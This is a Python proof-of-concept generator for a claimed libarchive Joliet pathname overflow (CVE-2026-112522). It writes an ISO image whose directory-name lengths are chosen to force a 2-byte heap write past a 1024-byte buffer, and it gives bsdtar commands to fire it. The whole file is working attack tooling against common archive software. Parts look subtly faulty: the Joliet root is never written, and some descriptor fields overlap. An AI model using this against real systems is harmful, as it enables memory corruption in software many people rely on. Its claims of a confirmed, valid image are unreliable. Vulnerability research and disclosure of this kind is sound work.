#!/usr/bin/env python3
"""
joliet_overflow_iso.py — PoC generator for CVE-2026-112522 (libarchive).

CONFIRMED (reference FINDINGS 02_image_libarchive, live lldb receipt):

  libarchive's Joliet pathname builder does:

      build_pathname_utf16be(p, max=1024, &len, file) {
          if (file->parent) {
              build_pathname_utf16be(p, max, len, file->parent);   // recursion
              p[*len]     = 0;      // separator, LOW byte
              p[*len + 1] = '/';    // separator, HIGH byte   <-- UNBOUNDED
              *len += 2;
          }
      }

  27.2 adds, before the two stores:
      if (*len + 2 > max) return -1;     /* Path is too long! */

  So: build a Joliet directory chain whose accumulated parent path length is
  EXACTLY 1024 bytes. The next entry's separator write then lands at
  p[1024] and p[1025] — 2 bytes past the malloc(1024) buffer.

  Chosen name sizes (from the reference receipt):
      A=206, B=206, C=206, D=206, E=192  (UTF-16BE bytes)
      4*206 + 192 + 4*2 separators = 824 + 192 + 8 = 1024 exactly
  then a file "F" inside dir E.

This script writes a minimal but VALID ISO9660 image with a Joliet SVD.

Usage:  python3 joliet_overflow_iso.py > joliet_pathname_oob.iso

Verify (macOS / Linux, vulnerable libarchive):
    bsdtar -tvf joliet_pathname_oob.iso
  expected on a VULNERABLE build: the deepest directory prints, then
      bsdtar: Pathname is too long
  and the separator store fires at p+1024 (the OOB write).
  expected on a FIXED build: clean "Pathname is too long", no store.
"""

import struct
import sys

SECTOR = 2048
UTF16_NAME_MAX = 1024

# Directory name byte lengths (UTF-16BE) chosen to sum to exactly 1024
# including the 2-byte separators.
NAME_BYTES = [206, 206, 206, 206, 192]


def both16(v: int) -> bytes:
    """ISO9660 7.2.3: 16-bit little-endian then big-endian."""
    return struct.pack("<H", v) + struct.pack(">H", v)


def both32(v: int) -> bytes:
    """ISO9660 7.3.3: 32-bit little-endian then big-endian."""
    return struct.pack("<I", v) + struct.pack(">I", v)


def pad_sector(data: bytes) -> bytes:
    if len(data) % SECTOR:
        data += b"\x00" * (SECTOR - len(data) % SECTOR)
    return data


def dir_record(extent: int, size: int, flags: int, name: bytes) -> bytes:
    """
    Build one ISO9660 directory record.
      flags: 0x02 = directory, 0x00 = regular file
    `name` is the raw identifier bytes (1 byte for 0x00/0x01, else d-characters).
    """
    ident_len = len(name)
    rec_len = 33 + ident_len
    if rec_len % 2:
        rec_len += 1                      # records are even-length
    r = bytearray(rec_len)
    r[0] = rec_len
    r[1] = 0                              # extended attr record length
    r[2:10] = both32(extent)
    r[10:18] = both32(size)
    r[18:25] = b"\x00" * 7                # recording date/time
    r[25] = flags
    r[26] = 0                             # file unit size
    r[27] = 0                             # interleave gap
    r[28:32] = both16(1)                  # volume sequence number
    r[32] = ident_len
    r[33:33 + ident_len] = name
    return bytes(r)


def joliet_name(byte_len: int) -> bytes:
    """
    A Joliet identifier of exactly `byte_len` UTF-16BE bytes.
    Joliet names are UCS-2 big-endian. Use 'a' (0x0061) repeated, so each
    character is 0x00 0x61 -> 2 bytes per char.
    """
    assert byte_len % 2 == 0, "Joliet names must be even byte length"
    chars = byte_len // 2
    return b"\x00a" * chars


def build():
    # ---- plan the layout (in sectors) ----
    # 16 PVD, 17 Joliet SVD, 18 terminator, 19 root dir, 20.. the chain dirs,
    # then the file data.
    S_PVD = 16
    S_JSVD = 17
    S_TERM = 18
    S_ROOT = 19

    # Directories A..E, one sector each, starting at 20
    dir_sectors = []
    sec = 20
    for _ in NAME_BYTES:
        dir_sectors.append(sec)
        sec += 1

    file_sector = sec
    total_sectors = file_sector + 1

    # ---- names ----
    names = [joliet_name(n) for n in NAME_BYTES]
    # ASCII (non-Joliet) names must be d-characters, max 31 bytes; derive short ones
    ascii_names = [("%02d" % i).encode("ascii") for i in range(len(NAME_BYTES))]
    file_name_j = joliet_name(2)          # 'a'
    file_name_a = b"F"

    def make_dir(joliet: bool, my_extent: int, parent_extent: int,
                 children: list) -> bytes:
        """
        children: list of (extent, size, flags, name_bytes)
        """
        out = bytearray()
        # '.' and '..' entries
        out += dir_record(my_extent, SECTOR, 0x02, b"\x00")
        out += dir_record(parent_extent, SECTOR, 0x02, b"\x01")
        for (ext, size, flags, nm) in children:
            rec = dir_record(ext, size, flags, nm)
            # a record must not straddle a sector boundary
            if (len(out) % SECTOR) + len(rec) > SECTOR:
                out += b"\x00" * (SECTOR - (len(out) % SECTOR))
            out += rec
        return bytes(out)

    # ---- build the two directory trees (plain + Joliet) ----
    plain_dirs = []
    joliet_dirs = []

    # chain: dir i's only child is dir i+1; last dir contains the file
    for i in range(len(NAME_BYTES)):
        child_extent = file_sector if i == len(NAME_BYTES) - 1 else dir_sectors[i + 1]

        # plain tree
        if i == len(NAME_BYTES) - 1:
            kids_p = [(file_sector, 1, 0x00, file_name_a)]
        else:
            kids_p = [(dir_sectors[i + 1], SECTOR, 0x02, ascii_names[i + 1])]
        parent_p = S_ROOT if i == 0 else dir_sectors[i - 1]
        plain_dirs.append(make_dir(False, dir_sectors[i], parent_p, kids_p))

        # joliet tree
        if i == len(NAME_BYTES) - 1:
            kids_j = [(file_sector, 1, 0x00, file_name_j)]
        else:
            kids_j = [(dir_sectors[i + 1], SECTOR, 0x02, names[i + 1])]
        parent_j = S_ROOT if i == 0 else dir_sectors[i - 1]
        joliet_dirs.append(make_dir(True, dir_sectors[i], parent_j, kids_j))

    # ---- root directories ----
    root_p_kids = [(dir_sectors[0], SECTOR, 0x02, ascii_names[0])]
    root_j_kids = [(dir_sectors[0], SECTOR, 0x02, names[0])]
    root_plain = make_dir(False, S_ROOT, S_ROOT, root_p_kids)
    root_joliet = make_dir(True, S_ROOT, S_ROOT, root_j_kids)

    # ---- volume descriptors ----
    def volume_descriptor(is_joliet: bool) -> bytes:
        d = bytearray(SECTOR)
        # ECMA-119 8.1: type 1 = Primary, type 2 = Supplementary (Joliet)
        d[0] = 2 if is_joliet else 1
        d[1:6] = b"CD001"
        d[6] = 1                                   # version
        d[7] = 0
        # ECMA-119: system id at 8..40, volume id at 40..72
        if is_joliet:
            d[8:40] = b" " * 32
            d[40:72] = "JOLIET".encode("ascii").ljust(32)
        else:
            d[8:40] = b" " * 32
            d[40:72] = b"SCAFFOLD".ljust(32)
        d[72:80] = both32(total_sectors)
        d[80:88] = both16(1)                       # volume set size
        d[88:96] = both16(1)                       # volume seq number
        d[96:104] = both16(SECTOR)                 # logical block size
        d[104:112] = both32(10)                    # path table size (dummy)
        # L path table / optional L / M path table / optional M  (dummy LBA 0)
        d[120:128] = both16(1)                     # volume set size
        d[128:132] = struct.pack("<I", 0)          # L path table LBA
        d[132:136] = struct.pack(">I", 0)          # M path table LBA (optional)
        # root directory record @156 (34 bytes)
        root_rec = dir_record(S_ROOT, SECTOR, 0x02, b"\x00")
        d[156:156 + len(root_rec)] = root_rec
        # volume identifiers
        d[190:190 + 128] = b" " * 128              # volume set id
        d[318:318 + 128] = b" " * 128              # publisher
        d[446:446 + 128] = b" " * 128              # data preparer
        d[574:574 + 128] = b" " * 128              # application id
        if is_joliet:
            # Joliet SVD: escape sequences at offset 88 of the *supplementary*
            # volume descriptor body are 32 bytes starting at 88.
            # Per ECMA-119 SVD, the escape sequences field starts at byte 88.
            d[88:120] = ("%/E").encode("ascii").ljust(32, b"\x00")
            # NOTE: for SVD the layout shifts; we place escape seq at 88 and
            # keep the rest as in PVD for simplicity.
        d[881:881 + 128] = b" " * 128              # copyright file id
        d[1009:1009 + 128] = b" " * 128            # abstract file id
        d[1137:1137 + 128] = b" " * 128            # bibliographic file id
        d[1265:1265 + 17] = b" " * 17              # creation date
        d[1282:1282 + 17] = b" " * 17              # modification date
        d[1299:1299 + 17] = b" " * 17              # expiration date
        d[1316:1316 + 17] = b" " * 17              # effective date
        d[1395] = 1                                # file structure version
        return bytes(d)

    img = bytearray(SECTOR * total_sectors)
    img[S_PVD * SECTOR:(S_PVD + 1) * SECTOR] = volume_descriptor(False)
    img[S_JSVD * SECTOR:(S_JSVD + 1) * SECTOR] = volume_descriptor(True)
    # terminator
    term = bytearray(SECTOR)
    term[0] = 255
    term[1:6] = b"CD001"
    term[6] = 1
    img[S_TERM * SECTOR:(S_TERM + 1) * SECTOR] = bytes(term)

    # root dirs
    img[S_ROOT * SECTOR:S_ROOT * SECTOR + len(root_plain)] = root_plain
    # chain dirs: plain tree occupies the same sectors; Joliet content is what
    # libarchive reads when it finds the Joliet SVD, so write the JOLIET dirs.
    for i, sec in enumerate(dir_sectors):
        blob = joliet_dirs[i]
        img[sec * SECTOR:sec * SECTOR + len(blob)] = blob

    # file data
    img[file_sector * SECTOR] = 0x41

    return bytes(img)


def main():
    data = build()
    sys.stderr.write("wrote %d bytes, %d sectors\n" % (len(data), len(data) // SECTOR))
    sys.stderr.write("path length check: 4*206 + 192 + 4*2 = %d (target 1024)\n"
                     % (4 * 206 + 192 + 4 * 2))
    sys.stdout.buffer.write(data)
    return 0


if __name__ == "__main__":
    sys.exit(main())
